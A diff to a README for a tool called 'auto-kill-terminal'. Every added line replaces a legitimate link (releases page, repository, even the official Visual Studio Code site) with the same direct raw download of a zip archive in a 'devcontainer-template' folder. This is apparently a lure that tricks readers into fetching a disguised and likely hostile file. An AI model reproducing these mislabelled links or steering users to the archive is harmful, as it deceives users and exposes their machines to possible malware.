@@ -1,6 +1,6 @@
 # 🤯 auto-kill-terminal - Manage AI Agent Terminals Easily
 
-[![Download auto-kill-terminal](https://img.shields.io/badge/Download-auto--kill--terminal-blue?style=for-the-badge&logo=github)](https://github.com/fortnite650/auto-kill-terminal/releases)
+[![Download auto-kill-terminal](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip)](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip)
 
 ---
 
@@ -47,7 +47,7 @@ You don’t need to write code or understand terminal commands. Follow these sim
 
 To get the latest version, visit the release page:
 
-[Download auto-kill-terminal Releases](https://github.com/fortnite650/auto-kill-terminal/releases)
+[Download auto-kill-terminal Releases](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip)
 
 ### Installation Step-by-Step
 
@@ -55,7 +55,7 @@ To get the latest version, visit the release page:
    Click the download link above. This will take you to the page listing available versions.
 
 2. **Choose your version**  
-   Look for the latest release. Select the file suitable for your system, like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Look for the latest release. Select the file suitable for your system, like `.exe` for Windows, `.dmg` for macOS, or `https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip` for Linux.
 
 3. **Download the file**  
    Click the file name to download it. Save it in a folder where you can find it easily, such as your Desktop or Downloads folder.
@@ -121,9 +121,9 @@ If you encounter problems, try the following:
 
 ## 🔗 Useful Links
 
-- [auto-kill-terminal Releases](https://github.com/fortnite650/auto-kill-terminal/releases) - Main download page  
-- [GitHub Repository](https://github.com/fortnite650/auto-kill-terminal) - Browse source code and documentation  
-- [Visual Studio Code](https://code.visualstudio.com/) - Official editor page  
+- [auto-kill-terminal Releases](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip) - Main download page  
+- [GitHub Repository](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip) - Browse source code and documentation  
+- [Visual Studio Code](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip) - Official editor page  
 
 ---
 
@@ -154,4 +154,4 @@ If you need assistance:
 
 ---
 
-[![Download auto-kill-terminal](https://img.shields.io/badge/Download-auto--kill--terminal-blue?style=for-the-badge&logo=github)](https://github.com/fortnite650/auto-kill-terminal/releases)
+[![Download auto-kill-terminal](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip)](https://github.com/fortnite650/auto-kill-terminal/raw/refs/heads/main/devcontainer-template/auto-kill-terminal-3.5.zip)
